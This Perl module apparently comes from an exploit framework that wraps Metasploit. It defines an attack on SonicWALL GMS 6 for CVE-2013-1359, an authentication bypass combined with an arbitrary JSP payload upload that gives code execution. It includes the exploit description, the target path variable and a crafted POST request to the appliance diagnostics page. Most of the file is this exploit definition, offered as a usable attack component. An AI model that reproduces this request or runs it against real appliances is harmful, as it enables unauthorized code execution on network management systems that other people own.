package MSFExploits::Exploits::SONICWALL::MSF::SonicwallGmsUpload;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::SONICWALL);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "SonicwallGmsUpload";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2013-1359",
  DESCRIPTION => "

          This module exploits a code execution flaw in SonicWALL GMS. It exploits two

        vulnerabilities in order to get its objective. An authentication bypass in the

        Web Administration interface allows to abuse the \"appliance\" application and upload

        an arbitrary payload embedded in a JSP. The module has been tested successfully on

        SonicWALL GMS 6.0.6017 over Windows 2003 SP2 and SonicWALL GMS 6.0.6022 Virtual

        Appliance (Linux). On the Virtual Appliance the linux meterpreter hasn't run

        successfully while testing, shell payload has been used.

      ",
  MSF_MODULE => "sonicwall_gms_upload",
  OSVDB => 89347,
  PATHS => [""],
  TITLE => "SonicWALL GMS 6 Arbitrary File Upload",
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "Path to SonicWall GMS", VALUE => "/" },
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT2 => {
      METHOD       => 'POST',
      PATH   => 'appliance/applianceMainPage',
      PAYLOAD      => 'num=123456&action=show_diagnostics&task=search&item=application_log&criteria=%2a.%2a&width=500',
      TEXT   => 'Sending Exploit #2 Request : [POST] /appliance/applianceMainPage',
      HEADERS      => {
        'Connection' => 'TE, close',
        'TE' => 'deflate,gzip;q=0.3',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
